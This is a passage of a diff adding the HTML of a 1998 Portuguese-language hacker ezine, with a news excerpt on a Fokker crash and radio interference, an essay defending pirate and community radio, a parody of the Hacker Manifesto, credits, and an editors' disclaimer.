Paulo 01/11/96, por exemplo):
+<p>
+-----------------------------------------<br>
+Especialistas discutem a causa do acidente 
+<p>
+A mais prov&aacute;vel, dizem, &eacute; a revers&atilde;o da turbina direita, mas h&aacute; quem fale em falha nos flaps de uma das asas e em eventual interfer&ecirc;ncia de sinais eletr&ocirc;nicos
+<p>
+[..]
+<p>
+A tese de uma influ&ecirc;ncia eletr&ocirc;nica nos equipamentos mec&acirc;nicos do Fokker, contudo, &eacute; vista com desconfian&ccedil;a pelos peritos. O professor de microondas da Escola Polit&eacute;cnica da Universidade de S&atilde;o Paulo (USP) Jos&eacute; Kleber da Cunha Pinto disse que os avi&otilde;es est&atilde;o sujeitos a interfer&ecirc;ncias eletromagn&eacute;ticas. "Mas elas n&atilde;o acionam equipamentos", afirmou. "Turbinas e trens de pouso s&atilde;o ligados fisicamente, por meio de cabos."
+<p>
+Freq&uuml;&ecirc;ncias
+<p>
+Pinto disse que ondas eletromagn&eacute;ticas s&oacute; interferem em aparelhos de navega&ccedil;&atilde;o, alt&iacute;metros e na comunica&ccedil;&atilde;o com a torre. O professor n&atilde;o acredita que uma r&aacute;dio pirata teria alterado a leitura de equipamentos. "Elas operam em FM, ou 110 mhz,
+mas a comunica&ccedil;&atilde;o dentro do avi&atilde;o &eacute; de acima de 150 mhz."
+<p>
+O perito aposentado da &aacute;rea de investiga&ccedil;&otilde;es de acidentes do Servi&ccedil;o Regional de Avia&ccedil;&atilde;o Civil (Serac) Roberto Peterka tamb&eacute;m n&atilde;o acredita na influ&ecirc;ncia eletr&ocirc;nica. Ele descartou uma eventual falha do piloto e enumerou ainda 30 fatores importantes a serem investigados, como o comportamento dos flaps das asas - que auxiliam na frenagem do avi&atilde;o. 
+<p>
+[..]
+<p>
+No ranking dos principais vil&otilde;es eletr&ocirc;nicos, o primeiro lugar &eacute; ocupado por celulares. Por conta do efeito comprometedor de telefones e computadores, um estudo sobre o problema est&aacute; sendo realizado pelo Departamento de Seguran&ccedil;a da Varig. "Mas &eacute; muito pouco prov&aacute;vel que esse tipo de interfer&ecirc;ncia consiga acionar um mecanismo como o da revers&atilde;o da turbina", afirmou Souza. O piloto observou que os avi&otilde;es s&atilde;o homologados para voar com apenas um motor. "O problema deve ter sido muito s&eacute;rio"...
+<p>
+-----------------------------------
+<p>
+Porque as r&aacute;dios s&atilde;o t&atilde;o un&acirc;nimes em condenar radios piratas, ent&atilde;o? Sera' que e' porque 60% dos parlamentares brasileiros tem sua propria radio? Sera' que e' porque o radio atinge mais as camadas populares do que a televisao? Afinal, o sujeito pode trabalhar e ouvir radio. O espaco de propaganda no radio e' algo caro. Tendo sua propria radio, fica mais facil pro politico fazer sua campanha eleitoral. Aquele politico do predio que caiu nao tinha sua propria radio, tinha tambem sua televisao. E era TVEducativa, sabem porque? Porque quando voce compra o material pra  transmitir ondas de TV voce precisa da programacao de alguma emissora, voce nao vai produzir material pra competir com uma Bandeirantes, Record ou Globo.
+<p>
+So' que essas emissoras, por exemplo nao dao espaco para que sejam produzidos programas locais, como a TVEducativa da'. O mesmo acontece com essas radios que tocam material da Jovem Pan. Paga-se milhoes por uma "franquia" que permita ao carinha la' no sertao ouvir "Os sobrinhos do Ata&iacute;de". Pra ser mais exato, acho que e' um milhao de Reais por mes, dependendo do publico alvo. Rola tamb&eacute;m uma grana de propaganda bem alta, pra n&atilde;o falar do boato de que as r&aacute;dios recebem grana das gravadoras para s&oacute; tocar m&uacute;sicas de gente de sucesso. E tenta voce fazer sua pr&oacute;pria r&aacute;dio pelos m&eacute;todos legais. Existe o boato que as concess&otilde;es s&atilde;o feitas quase que a peso de ouro em propinas. Nao &eacute; f&aacute;cil fazer sua pr&oacute;pria r&aacute;dio no Brasil. Tem que ter grana. Muita grana.
+<p>
+E legal, que lance &eacute; esse de r&aacute;dio comunit&aacute;ria? Antes de cair a nova legisla&ccedil;&atilde;o, permitindo isso, era algo que tamb&eacute;m era chamado de r&aacute;dio pirata. Veja o caso de uma cidadezinha, de uns 3 mil habitantes. N&atilde;o precisa de um transmissor grande. A r&aacute;dio  precisa de alguma coisa pra n&atilde;o ficar isolada do mundo, saber o que est&aacute; passando, previsao do tempo, etc.. n&atilde;o tem recursos pra entrar legalmente e conseguir um alvar&aacute; de "explora&ccedil;&atilde;o comercial" da frequ&ecirc;ncia de r&aacute;dio . Pois, era isso que era proibido de existir. As pessoas que quisessem, da mesma forma que est&aacute; se fazendo com web pages, ter seu pr&oacute;prio servi&ccedil;o de r&aacute;dio difus&atilde;o individual eram podadas no seu direito de exprimir sua voz. Ou fatura e paga imposto ou nada feito.  Ali&aacute;s, considerando as
+possibilidades, o Brasil tem um n&uacute;mero reduzid&iacute;ssimo de r&aacute;dios para a extens&atilde;o territorial. 
+<p>
+A legisla&ccedil;&atilde;o que permite agora, que pessoas sem interesse em ganho financeiro possam veicular sua voz para um publico amplo, n&atilde;o teve divulga&ccedil;&atilde;o nos grandes jornais. Falou-se da lei de direito autoral, da nova lei regulamentando a pirataria de programas, mas n&atilde;o se falou da lei liberando as r&aacute;dios n&atilde;o-comerciais. Tudo isso evidencia as grandes emissoras, tanto de r&aacute;dio como televis&atilde;o, querem continuar dominando e literalmente obrigando todo mundo a ouvir aquilo que para eles &eacute; not&iacute;cia, aquilo que para eles &eacute; m&uacute;sica. E pra quem n&atilde;o sabe, houve muita gente que perdeu equipamentos e foi presa, porque tinha uma r&aacute;dio que atendia a interesses de uma pequena comunidade s&oacute; porque estava "burlando a lei". Os parlamentares votaram essa legisla&ccedil;&atilde;o, vale a pena agora todo mundo se conscientizar que o espa&ccedil;o das ondas de r&aacute;dio deve ser reclamado e tomado. A informa&ccedil;&atilde;o deve ser livre! Viva as ondas
+livres!
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+
+<h1><center>
+<a name="hippie">The Conscience of a Hippie</a>
+</center></h1>
+By Ur'Lord Pyro -K on Saterday, March 29th, 1995.
+<p>
+Another one got beat up today, it's all over the village. "Hippie beat up for
+passing out flowers.", "Hippy beaten after saying peace to a biker". damn Hippies, they're all alike.
+<p>
+But did you, in your clean clothes and 1990's techonobrain, ever take a look behind the yes of a hippie? Did you ever wonder what makes him stink, what put him in the shape he's in, what may have molded on him?
+<p>
+I'm a hippie, enter my world.
+<p>
+Mine is a world that begins at school. I'm dumber than most of the other kids,
+this stuff they teach us is just way too hard. damn smart people, they're all alike.
+<p>
+I dropped out of jr.high or high school. I've listened to teachers explain for
+the hudredth time what a noun is, I still dont get it. "uh, like, uh, No Ms
+Mugliagutter, I didnt show my work, i like, um, did it in my head and stuff." 
+damn teacher, cauth me cheating again, they're all alike.
+<p>
+I made a discovery today. I found a bong and some pot. Wait a minute, this is
+cool. I can get high all I want, if I make a mistake, it's ok, because I'm
+high, not because I'm stupid,<br>
+<pre>            or braindead
+            or lazy
+            or dont think the teachers likes me</pre>
+<p>
+damn hippie, all he does is get high. I wish I were him.
+<p>
+Then it happened... a door opened to a world... and my parents through me
+out. A plea is made, a refuge from the real world is sought, a commun is found
+<p>
+"dude, this is the shit. this is were I belong..."
+I dont know anything here... even if I've been told it a hundred times, even if
+I listened to them intently, I dont know shit.
+Damn hippie, so incompitent that he can't tie his own shoes. They're all alike.
+<p>
+You bet yer bong water we're all alike... we've been fed like babies on silver
+spoons by our our parents and never learned to fend for ourselves. The times
+they tried to teach us responsibilty we made our sisters do the work. We've
+been cominated by guilt-ridden souls, and beaten up for passing out flowers.
+The few that gaves us a chance quickly dropped us off in the middle of the
+desert.
+<p>
+this is your world now. the world of 3 meals a day and a roof over your head.
+We exist in the dumpsters and back alleyways of your streets begging for food
+when we could just get jobs and support ourselves. We try to sell flowers, and
+you beat us up. We say "love eachother" and you beat us up. We walk on the
+otherside of the street to avoid you and you still beat us up.
+<p>
+You work, buy homes, buy cars, buy food, and try and teach us how we can do
+the same thing, yet we just listen.
+<p>
+yeah, like, um, I'm a hippie. My life is made up of searching for food in
+dumbsters, and finding a place to sleep where the man wont get down on me.
+My life is proving I'm dumber than you, something I'll never forgive you for.
+<p>
+I'm a hippie, and this is my, uh, like, uh, man-i, manifesto. you may have
+beaten up this one, you may beat me up, you might beat us all up, i mean, like,
+we're all alike and junk.
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+
+<a name="Creditos"><h1><center>Cr&eacute;ditos e Agradecimentos</center></h1></a>
+<p> Ben Reilly agradece ao colega Derneval pela c&oacute;pia de seu artigo
+na 2600.
+<p> Agradecemos todos os que nos escreveram, colaboraram de forma direta ou indireta para a realiza&ccedil;&atilde;o desse zine. Lembramos tamb&eacute;m as pessoas que freq&uuml;entam o
+Hack Hour e nos ajudam a fazer deste ciberespa&ccedil;o um lugar melhor. Valeu galera!!!
+
+<p>
+Cyber Optik
+(<a href="mailto:cyberoptik@hackhour.com.br">cyberoptik@hackhour.com.br</a>)<br>
+Overall (<a href="mailto:overall@hackhour.com.br">overall@hackhour.com.br</a>)
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+
+
+<font color="#00FF00">
+<b>Nota dos Editores</b>:
+<ul>
+<li>N&oacute;s da HUB n&atilde;o incentivamos que voc&ecirc; utilize de forma maliciosa, nenhuma das informa&ccedil;&otilde;es contidades nesta publica&ccedil;&atilde;o. Todo o conte&uacute;do desta eZine foi produzido/traduzido com a inten&ccedil;&atilde;o de alert&aacute;-los dos perigos que todos podem estar correndo se os recursos de redes e telefonia que todos utilizamos diariamente n&atilde;o forem utilizados adequadamente.
+<li>Se vc utilizar estas informa&ccedil;&otilde;es para danificar ou prejudicar qualquer pessoa, m&aacute;quina ou empresa, n&oacute;s <b>N&Acirc;O</b> nos responsabilizamos por suas atitudes. Ali&aacute;s, n&atilde;o nos responsabilizamos por suas atitudes independente de quais foram suas fontes de informa&ccedil;&otilde;es.
+<li>Antes de utilizar este conhecimento de forma maliciosa, lembre-se apenas de que existem leis internacionais rigorosas para previnir este tipo de atitude.
+<li>A HUB n&atilde;o se responsabiliza pelas opini&otilde;es e conceitos emitidos em textos assinados. Os textos assinados s&atilde;o de responsabilidade exclusiva de seu autor/tradutor.
+<li>O material produzido pela equipe da HUB n&atilde;o poder&aacute; ser reproduzido sem que os cr&eacute;ditos do autor e edi&ccedil;&atilde;o apare&ccedil;am anexados ao mesmo.
+<li>Todas as marcas registradas sobre nomes, produtos, equipamentos ou qualquer outra citada nesta edi&ccedil;&atilde;o pertencem &agrave; seus respectivos propriet&aacute;rios.
+</ul>
+</font>
+<hr>
+
+Quarta-feira, 8 de Abril de 1998 18:12:07
+
+</body>
+</html>
